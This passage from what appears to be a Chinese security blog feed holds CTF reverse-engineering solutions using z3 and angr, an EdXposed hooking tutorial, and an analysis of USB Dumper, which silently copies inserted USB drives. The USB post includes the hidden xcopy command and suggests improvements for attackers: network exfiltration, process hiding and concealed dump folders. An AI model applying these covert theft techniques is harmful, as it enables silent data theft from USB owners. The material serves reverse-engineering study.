class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">newTable = <span class="string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> target:</span><br><span class="line">idx = newTable.find(i)</span><br><span class="line">ori += oldTable[idx]</span><br><span class="line"><span class="built_in">print</span> base64.b64decode(ori)</span><br></pre></td></tr></table></figure><br><h3 id="equation-javascript-JsFuck混淆"><a href="#equation-javascript-JsFuck混淆" class="headerlink" title="equation | javascript, JsFuck混淆"></a>equation | javascript, JsFuck混淆</h3><p>可以直接用 js 写正则替换，但最后还是要到 python 里来用 z3 求解器，所以干脆就全用 python 好了，python 里执行 js 代码需要用到 PyExecJS 库。所有等式反混淆脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ExecFront</span>(<span class="params">string</span>):</span></span><br><span class="line">num = execjs.<span class="built_in">eval</span>(string.group(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;l[%s]&quot;</span> % num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ExecBehind</span>(<span class="params">string</span>):</span></span><br><span class="line">num = execjs.<span class="built_in">eval</span>(string.group(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot; == %s&quot;</span> % num</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;equation.html&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line"><span class="comment"># 取出 html 文档中的所有等式</span></span><br><span class="line">equations = re.search(<span class="string">r&quot;if\((.+)\)&#123;&quot;</span>, data).group(<span class="number">1</span>).split(<span class="string">&quot;&amp;&amp;&quot;</span>)</span><br><span class="line"><span class="comment"># 每个等式分两部分匹配处理</span></span><br><span class="line"><span class="keyword">for</span> equation <span class="keyword">in</span> equations:</span><br><span class="line"><span class="comment"># &#x27;==&#x27; 前面的部分</span></span><br><span class="line">tmp = re.sub(<span class="string">r&quot;(?:l\[)([!\+\[\]]+)(?:\])&quot;</span>, ExecFront, equation)</span><br><span class="line"><span class="comment"># &#x27;==&#x27; 后面的部分</span></span><br><span class="line"><span class="built_in">print</span> re.sub(<span class="string">r&quot;(?:==)(.+)&quot;</span>, ExecBehind, tmp)</span><br></pre></td></tr></table></figure><p>还挺得劲儿：</p><p><img src="../img/equation/1.png" alt="equation"></p><p>但是为了方便使用 z3，还需要小改亿些地方：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> z3</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ExecFront</span>(<span class="params">string</span>):</span></span><br><span class="line">num = execjs.<span class="built_in">eval</span>(string.group(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;flag_char[%s]&quot;</span> % num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ExecBehind</span>(<span class="params">string</span>):</span></span><br><span class="line">num = execjs.<span class="built_in">eval</span>(string.group(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot; == %s&quot;</span> % num</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;equation.html&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line"></span><br><span class="line">flag_len = <span class="number">0x2a</span></span><br><span class="line">solver = z3.Solver()</span><br><span class="line">flag_char = [z3.Int(<span class="string">&quot;char%d&quot;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_len)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加约束</span></span><br><span class="line">equations = re.search(<span class="string">r&quot;if\((.+)\)&#123;&quot;</span>, data).group(<span class="number">1</span>).split(<span class="string">&quot;&amp;&amp;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> equation <span class="keyword">in</span> equations:</span><br><span class="line">tmp = re.sub(<span class="string">r&quot;(?:l\[)([!\+\[\]]+)(?:\])&quot;</span>, ExecFront, equation)</span><br><span class="line">eq = re.sub(<span class="string">r&quot;(?:==)(.+)&quot;</span>, ExecBehind, tmp)</span><br><span class="line"><span class="comment"># print eq</span></span><br><span class="line"><span class="built_in">eval</span>( <span class="string">&quot;solver.add( &quot;</span> + eq + <span class="string">&quot; )&quot;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解器求解</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> solver.check() == z3.sat:</span><br><span class="line">s = solver.model()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_len):</span><br><span class="line">flag += <span class="built_in">chr</span>(s[flag_char[i]].as_long())</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><br><h3 id="ACTF新生赛2020-Universe-final-answer-x86-elf-z3-angr"><a href="#ACTF新生赛2020-Universe-final-answer-x86-elf-z3-angr" class="headerlink" title="[ACTF新生赛2020]Universe_final_answer | x86,elf,z3,angr"></a>[ACTF新生赛2020]Universe_final_answer | x86,elf,z3,angr</h3><p>sub_860 十个未知数，十个方程，未知数对应输入的 key，可以使用 python z3-solver 库来求解多元一次方程组，但我懒得从 ida 上摘方程了，angr 最喜欢这种了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">base_addr = <span class="number">0x400000</span></span><br><span class="line"></span><br><span class="line">project = angr.Project(<span class="string">&quot;./UniverseFinalAnswer&quot;</span>, </span><br><span class="line">main_opts = &#123;<span class="string">&quot;base_addr&quot;</span> : base_addr&#125;,</span><br><span class="line">auto_load_libs = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">state = project.factory.entry_state(add_options = &#123;angr.options.LAZY_SOLVES&#125;)</span><br><span class="line">simManager = project.factory.simgr(state)</span><br><span class="line">simManager.explore(find = base_addr + <span class="number">0x71A</span>, avoid = base_addr + <span class="number">0x6EF</span>)</span><br><span class="line"></span><br><span class="line">flag = simManager.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(flag[:<span class="number">10</span>].decode())</span><br></pre></td></tr></table></figure><p>得到 F0uRTy_7w@，运行程序，输入该 key 得到 flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 逆向 </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xposed与EdXposed框架搭建</title>
      <link href="/2020/10/13/Xposed%E4%B8%8EEdXposed%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA/"/>
      <url>/2020/10/13/Xposed%E4%B8%8EEdXposed%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>本文将介绍 Android 5.0 ~10.0 版本 <strong>模拟器</strong> 与 <strong>真机</strong> Xposed/EdXposed 框架的搭建，并提供一个 hook 示例</p><h2 id="MuMu-模拟器-Xposed-框架搭建"><a href="#MuMu-模拟器-Xposed-框架搭建" class="headerlink" title="MuMu 模拟器 Xposed 框架搭建"></a>MuMu 模拟器 Xposed 框架搭建</h2><p><strong>PS. 该方法适用 Android 5.0 ~ 8.1 的模拟器</strong></p><p>1.打开 root 权限</p><p>​    点击右上角三条横杠的图标，选择 <strong>设置中心</strong></p><p><img src="../img/2.png" alt="打开root权限"></p><p>​    在基本设置中勾选 <strong>开启 root 权限</strong>，保存并重启模拟器</p><p><img src="../img/3.png" alt="打开root权限"></p><p>2.从 <a href="https://forum.xda-developers.com/showthread.php?t=3034811">网站</a> 下载 Xposed 最终版 apk 并在模拟器中安装</p><p><img src="../img/4.png" alt="下载Xposed apk"></p><p>3.打开安装好的 <code>Xposed Installer</code>，点击 <strong>Version89</strong>，选择 <strong>Install</strong></p><p><img src="../img/5.png" alt="安装框架"></p><p>4.等待一会儿，没有出现红字表示安装成功，应该会提示重启手机生效，如果没有提示就手动重启。再次打开 <code>Xposed Installer</code> 显示框架激活成功，即可开始 hook 之旅</p><p><img src="../img/6.png" alt="安装成功"></p><br><h2 id="OnePlus-真机-EdXposed-框架搭建"><a href="#OnePlus-真机-EdXposed-框架搭建" class="headerlink" title="OnePlus 真机 EdXposed 框架搭建"></a>OnePlus 真机 EdXposed 框架搭建</h2><p><strong>PS. 此方法目前适用 Android 8.0 ~ 10.0，需要手机 root 权限</strong></p><p>这里假设手机已经刷入了第三方 recovery 及通过 Magisk 获取了 root 权限，作者在 github 上这样写到：</p><p><img src="../img/10.png" alt="安装方法"></p><p>1.首先挂个到 M 国的梯子，打开 <code>Magisk Manager</code>，进入模块界面（旧版本在<strong>下载</strong>中），在线模块中会出现很多仓库中的模块</p><p><img src="../img/7.png" alt="主页"></p><p>2.直接搜索 riru，先安装 <strong>Riru - core</strong>，重启后安装 <strong>Riru - EdXposed</strong>，再重启一次</p><p><img src="../img/8.png" alt="模块视窗"></p><p>3.到 <a href="">github</a> 上下载配套的 EdXposed Manager 并安装、重启</p><p><img src="../img/9.png" alt="安装Edxposed Manager"></p><p>4.打开 EdXposed Manager，出现如下界面表示框架安装成功，剩下的模块开发流程与 Xposed 相同</p><p><img src="../img/11.png" alt="安装成功"></p><br><h2 id="EdXposed-Hook-示例"><a href="#EdXposed-Hook-示例" class="headerlink" title="EdXposed Hook 示例"></a>EdXposed Hook 示例</h2><p>这里以 OnePlus 真机（Android 9）为例，Xposed 框架与其操作完全相同，开发 IDE 使用 Android Studio 4.0.1</p><h3 id="示例-APP"><a href="#示例-APP" class="headerlink" title="示例 APP"></a>示例 APP</h3><p>下面是被 hook 程序 <code>MainActivity</code> 代码，该 app 只是简单的将 Hello World! 显示在中央：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.helloword;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        TextView tv = (TextView) findViewById(R.id.tv);</span><br><span class="line">        tv.setText(GetWelcomeString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">GetWelcomeString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>界面：</p><p><img src="../img/12.png" alt="被hook程序"></p><p>本例的目标是 hook <code>GetWelcomeString()</code> 函数，使软件显示 <strong>Hello World! - Hooked</strong></p><br><h3 id="创建并配置-Hook-项目"><a href="#创建并配置-Hook-项目" class="headerlink" title="创建并配置 Hook 项目"></a>创建并配置 Hook 项目</h3><p>创建新的 EdXposed 项目，并添加新 Java 类，命名为 <strong>HookMain</strong></p><p><img src="../img/13.png" alt="EdXposed项目"></p><p>app 层级下创建一个目录 <strong>mylib</strong>，下载 <a href="https://forum.xda-developers.com/xposed/xposed-api-changelog-developer-news-t2714067">XposedBridgeApi-54.jar</a> 并拷贝到 mylib 中（不要直接放在 libs 目录中）</p><p><img src="../img/14.png" alt="mylib"></p><p>右键该 jar 包，选择 <strong>Add As Library…</strong>，弹出窗口中选择 OK</p><p><img src="../img/15.png" alt="mylib"></p><p>打开 <code>app\src\build.gradle</code>，找到 dependencies，删除 <strong>implementation files(‘mylib\XposedBridgeApi-54.jar’)</strong>，添加 <strong>compileOnly ‘de.robv.android.xposed:api:82’</strong>。有的教程里还在用 provided 关键字，该关键字已经被废弃，取而代之的是 compileOnly</p><p><img src="../img/16.png" alt="build.gradle"></p><p>编辑 <code>AndroidManifest.xml</code>，在 <strong>application</strong> 标签下为模块添加 meta-data 描述</p><p><img src="../img/17.png" alt="AndroidManifest"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;xposedmodule&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;xposeddescription&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;EdXposed 插件开发测试&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;xposedminversion&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;54&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>最后需要告诉框架此模块的入口类在哪里</p><p>创建 assets 文件夹</p><p><img src="../img/18.png" alt="创建assets文件夹"></p><p>在 assets 文件夹下创建 xposed_init 文件</p><p><img src="../img/19.png" alt="xposed_init"></p><p>写入 HookMain 的路径</p><p><img src="../img/20.png" alt="xposed_init"></p><br><h3 id="编写-Hook-代码"><a href="#编写-Hook-代码" class="headerlink" title="编写 Hook 代码"></a>编写 Hook 代码</h3><p>如图：</p><p><img src="../img/21.png" alt="hook代码"></p><br><h3 id="安装运行"><a href="#安装运行" class="headerlink" title="安装运行"></a>安装运行</h3><p>将该 hook 用的 apk 安装到手机上，在 EdXposed Manager 中打开模块视窗，激活该模块</p><p><img src="../img/22.png" alt="激活模块"></p><p>重启后打开 HelloWorld 的 app，可以看到，已经被 Hook 了</p><p><img src="../img/23.png" alt="hook成功"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入剖析USB_Dumper原理</title>
      <link href="/2020/10/11/%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90USB-Dumper%E5%8E%9F%E7%90%86/"/>
      <url>/2020/10/11/%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90USB-Dumper%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>软件下载地址：<a href="https://sourceforge.net/projects/usbdumper/">sourceforge</a></p><p>软件运行界面：</p><p><img src="../img/1.png" alt="USBDumper运行界面"></p><p>点击 Start 就弹出一个窗口提示 “USB Dumper have started !!! Close it Manually from the Task Manager !!!”，并开始在后台进行监听，可以通过任务管理器杀掉。当 U 盘插入时，就会自动将盘上的数据拷贝到 <code>C:\USB</code> 目录下（没有的话会自行创建）</p><p>peid 查了下发现是 .NET 框架的程序，反编译工具一开始选用的 dnSpy，后来发现在局部变量的处理上没有 Reflector 好，所以换成了后者，可惜的是不能加注释，也不能重命名方法和变量……</p><br><h2 id="查找关键函数"><a href="#查找关键函数" class="headerlink" title="查找关键函数"></a>查找关键函数</h2><p>在 USB_Dumper 的名称空间下看到一个 Main 类，点开又找到两个方法 <code>Button1_Click</code>  和 <code>Button2_Click</code>，</p><p>猜测这两个方法对应软件主界面的 Start 和 Cancel 按钮。查看 Button1_Click 反编译后的代码，果不其然：</p><p><img src="../img/2.png" alt="button1_click"></p><p>从这里可以看出来，显示完提示之后，会打开 Form2（Form2.Show()），该类在 <code>USB_Dumper.My.MyProject</code> 中，获取时会返回一个 <code>USB_Dumper.Form2</code> 的实例：</p><p><img src="../img/3.png" alt="Form2"></p><p>终于在该类找到关键方法 <code>WndProc()</code>，WndProc 是窗口过程函数，当程序窗口收到一个 OS 消息后就会调用该函数</p><p><img src="../img/5.png" alt="WndProc函数"></p><br><h2 id="分析-WndProc"><a href="#分析-WndProc" class="headerlink" title="分析 WndProc"></a>分析 WndProc</h2><p>先来看检测到 U 盘插入时的代码：</p><p><img src="../img/4.png" alt="WndProc函数"></p><br><h3 id="U-盘插入的检测"><a href="#U-盘插入的检测" class="headerlink" title="U 盘插入的检测"></a>U 盘插入的检测</h3><p>第一句 <code>if (M.Msg == 0x219)</code> 在判断到来的消息是不是 <code>WM_DEVICECHANGE</code>（值为 0x219），当设备发生变更时（设备拔插、设备配置信息更改等情况）系统会向每个窗口发送 WM_DEVICECHANGE 消息，并通过携带的 wParam 与 lParam 参数来便于进程判断设备变更的原因及相关数据，这是由 Windows 的消息机制决定的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IntPtr wParam = M.WParam;</span><br><span class="line">if (wParam == ((IntPtr) 0x8000))</span><br></pre></td></tr></table></figure><p>接着获取 wParam，并判断是否等于 0x8000，可以在 <a href="https://docs.microsoft.com/zh-cn/windows/win32/devio/wm-devicechange">微软 API 文档</a> 中查询 WM_DEVICECHANGE 来查看 wParam 各种的值代表什么意思：</p><p><img src="../img/6.png" alt="wParam"></p><p>0x8000 对应 <code>DBT_DEVICEARRIVAL</code>，表示本次设备变更的原因是 <strong>有一个可用的设备接入了</strong>，下面的 0x8004 后边会用到，0x8004 表示 <strong>有一个设备移除了</strong></p><p>接着 <code>if (Marshal.ReadInt32(M.LParam, 4) == 2)</code> 判断从 lParam 中读取到的值是否为 2。根据 <a href="https://docs.microsoft.com/en-us/windows/win32/api/dbt/ns-dbt-dev_broadcast_hdr">API 文档</a> 得知，此处的 lParam 是一个 DEV_BROADCAST_HDR 结构体指针：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DEV_BROADCAST_HDR</span> &#123;</span></span><br><span class="line">  DWORD dbch_size;</span><br><span class="line">  DWORD dbch_devicetype;</span><br><span class="line">  DWORD dbch_reserved;</span><br><span class="line">&#125; DEV_BROADCAST_HDR;</span><br></pre></td></tr></table></figure><p><code>Marshal.ReadInt32(IntPtr, Int32)</code> 函数的作用是 <strong>从 IntPtr 指向的内存中按给定的偏移量 Int32 读取一个 32 位带符号整数</strong>，这里的 Marshal.ReadInt32(M.LParam, 4) 表示从 LParam 指向的内存地址处偏移 4 字节读取一个 DWORD，即 DEV_BROADCAST_HDR.dbch_devicetype，开发人员根据该值来判断设备类型，从而将 DEV_BROADCAST_HDR 结构体转换为 <strong>各设备对应的设备管理结构体</strong></p><p>这里判断表示 dbch_devicetype 是否为 2，即<strong>设备的类型是否为逻辑卷</strong>：</p><p><img src="../img/7.png" alt="lParam"></p><p>如果是逻辑卷，就将 DEV_BROADCAST_HDR 结构体转换为 DEV_BROADCAST_VOLUME：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DEV_BROADCAST_VOLUME dev_broadcast_volume = new DEV_BROADCAST_VOLUME();</span><br><span class="line">dev_broadcast_volume = (DEV_BROADCAST_VOLUME) Marshal.PtrToStructure(M.LParam, typeof(DEV_BROADCAST_VOLUME));</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/dbt/ns-dbt-dev_broadcast_volume?redirectedfrom=MSDN">文档</a> 中也可以找到 DEV_BROADCAST_VOLUME 的定义：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DEV_BROADCAST_VOLUME</span> &#123;</span></span><br><span class="line">  DWORD dbcv_size;</span><br><span class="line">  DWORD dbcv_devicetype;</span><br><span class="line">  DWORD dbcv_reserved;</span><br><span class="line">  DWORD dbcv_unitmask;</span><br><span class="line">  WORD  dbcv_flags;</span><br><span class="line">&#125; DEV_BROADCAST_VOLUME;</span><br></pre></td></tr></table></figure><p>再接着又是一个判断 <code>if (dev_broadcast_volume.Dbcv_Flags == 0)</code>，由下图可知，表示本次变更受到影响的是物理的设备或驱动：</p><p><img src="../img/8.png" alt="dbcv_flags"></p><p>综合四个 if 判断：</p><ul><li><strong>M.Msg == 0x219</strong>  -&gt;  消息类型 == WM_DEVICECHANGE（设备发生变更）</li><li><strong>wParam == 0x8000</strong>  -&gt;  设备变更原因 == DBT_DEVICEARRIVAL（设备接入）</li><li><strong>Marshal.ReadInt32(M.LParam, 4) == 2</strong>  -&gt;  设备类型 == Logical volume（逻辑卷）</li><li><strong>dev_broadcast_volume.Dbcv_Flags == 0</strong>  -&gt;  本次变更受到影响的是物理的设备或驱动</li></ul><p>可以得出结论，<strong>有物理可用的移动逻辑卷设备接入</strong></p><br><h3 id="查找-U-盘盘符"><a href="#查找-U-盘盘符" class="headerlink" title="查找 U 盘盘符"></a>查找 U 盘盘符</h3><p>接下来要做的事就是找到该设备对应的盘符，然后就可以进行文件拷贝了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int num2 = 0;</span><br><span class="line">do &#123;</span><br><span class="line">if (Math.Pow(2.0, (double) num2) == dev_broadcast_volume.Dbcv_Unitmask) &#123;</span><br><span class="line">string str = Conversions.ToString(Strings.Chr(0x41 + num2)) + @&quot;:\*&quot;;</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br><span class="line">num2++;</span><br><span class="line">num5 = 20;</span><br><span class="line">&#125; while (num2 &lt;= num5);</span><br></pre></td></tr></table></figure><p>程序通过一个 do-while 循环来查找接入设备的盘符，Dbcv_Unitmask 是刚提到的 DEV_BROADCAST_VOLUME 结构体的一个成员：</p><p><img src="../img/9.png" alt="dbcv_unitmask"></p><p>该字段是一个掩码，用于标记当前设备的盘符，<strong>当最低位（Bit 0）为 1，其他位都为 0 时，表示该设备是 A 盘</strong>，同理，当 Bit 1（位 1）标记为 1 时，表示该设备是 B 盘</p><p><code>Math.Pow(2.0, (double) num2)</code> 即 2 的 num2 次方，换种写法就是 <strong>1 &lt;&lt; num2</strong>，所以这个循环是在找 Dbcv_Unitmask 的哪一位是 1（并设置了一个搜索上限 20）。找到后，用左移的位数加上 0x41（’A’）得到目标盘符的 ascii 码，转换成 string 后（Conversions.ToString）与 :\* 拼接。如果找到 U 盘的盘符是 F，则拼接得到 F:\*，表示 U 盘中的所有内容</p><br><h3 id="文件拷贝"><a href="#文件拷贝" class="headerlink" title="文件拷贝"></a>文件拷贝</h3><p>最后判断 C:\USB 目录是否存在（DirectoryExists），不存在就创建（CreateDirectory），然后通过静态方法 <code>Interaction.Shell</code> 执行 xcopy 命令来拷贝文件：</p><p><img src="../img/10.png" alt="code"></p><p><code>Interaction.Shell</code> 函数有 4 个参数</p><ul><li><strong>Pathname</strong>：要执行的程序名以及任何需要的参数和命令行开关</li><li><strong>Style</strong>：要运行的程序的窗口样式<ul><li><strong>AppWinStyle.Hide</strong> 隐藏窗口并为隐藏的窗口提供焦点</li><li>AppWinStyle.NormalFocus 为窗口提供焦点，并以最近的大小和位置显示窗口</li><li>AppWinStyle.MinimizedFocus 为窗口提供焦点，并以图标的形式显示窗口</li><li>AppWinStyle.MaximizedFocus 为窗口提供焦点，并以全屏方式显示窗口</li><li>AppWinStyle.NormalNoFocus 将窗口设置为最近的大小和位置。当前活动窗口保持焦点</li><li>AppWinStyle.MinimizedNoFocus 以图标的形式显示窗口。当前活动窗口保持焦点</li></ul></li><li><strong>Wait</strong>：指示 Shell 函数是否应等待程序完成的值</li><li><strong>Timeout</strong>：Wait 为 true 时该参数指定等待完成的毫秒数。如果将它设置为 -1，则 Shell 等到程序完成才返回</li></ul><p>假设上一步拼接得到的 str 为 <code>F:\*</code>，则将要执行的命令为 <code>xcopy F:\* /y /q /h /e /i C:\USB</code></p><p><code>xcopy</code> 命令参数</p><ul><li><strong>/y</strong>：禁止提示确认要覆盖已存在的目标文件</li><li><strong>/q</strong>：禁止显示 xcopy 的消息</li><li><strong>/h</strong>：复制具有隐藏和系统文件属性的文件</li><li><strong>/e</strong>：复制所有子目录，包括空目录</li><li><strong>/i</strong>：如果目标路径不存在，xcopy 将依据给定的目标路径创建一个新目录</li></ul><p>现在，USB Dumper 的原理就已经昭然若揭了 —— <strong>监听设备变更消息，如果有物理可用的移动逻辑卷设备接入，找到其盘符，拷贝文件</strong></p><br><h3 id="检测-U-盘移除"><a href="#检测-U-盘移除" class="headerlink" title="检测 U 盘移除"></a>检测 U 盘移除</h3><p>WndProc 函数剩下的代码如下，用于处理 U 盘退出事件：</p><p><img src="../img/11.png" alt="code"></p><p>0x8004 表示<strong>有设备移除了</strong>，后面的代码与之前分析的基本相同。不过这里只取到了移除设备的盘符，放在 str4 中，没有进行其他操作</p><br><h2 id="攻击方改进思考"><a href="#攻击方改进思考" class="headerlink" title="攻击方改进思考"></a>攻击方改进思考</h2><ol><li>可以考虑在设备移除时判断移除的是否为之前插入的设备，如果是，则将 C:\USB 目录下的文件通过网络发送给攻击者（具体实现起来还可以对 C:\USB 的目录结构进行管理，防止反复发送重复数据，增加指定文件后缀传输功能也是不错的）</li><li>该进程仍然可以在任务管理器中被发现，可以考虑 hook Win API 来隐藏 USB Dumper 进程</li><li>C:\USB 目录太过明显，可以考虑生成随机字符串作为目录名，并将该目录藏得越深越好</li><li>定期删除备份目录下的文件（成功发送给攻击者的那部分），并根据磁盘剩余容量情况动态更改备份目录路径</li></ol><br><h2 id="防御方思路借鉴"><a href="#防御方思路借鉴" class="headerlink" title="防御方思路借鉴"></a>防御方思路借鉴</h2><ol><li>这个思路也可以用于检测 U 盘是否携带病毒，当检测到 U 盘插入，检查目录下是否有如 autorun 等可疑文件。如果有，则用 API 强制弹出 U 盘并提醒用户</li><li>当然也可以加入加/解密模块，做成只有当指定 U 盘插入时，才会解密计算机上的文件的效果，当 U 盘拔出，又将文件加密存储</li></ol><br><p>PS. 基于这个原理，我也实现了一个 USB Dumper 的 C++ GUI 版本，代码开放在 <a href="https://github.com/in1nit1t/USB-Dumper">github</a>，仅供学习交流使用</p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> .NET </tag>
            
        </tags>
      
    </entry>
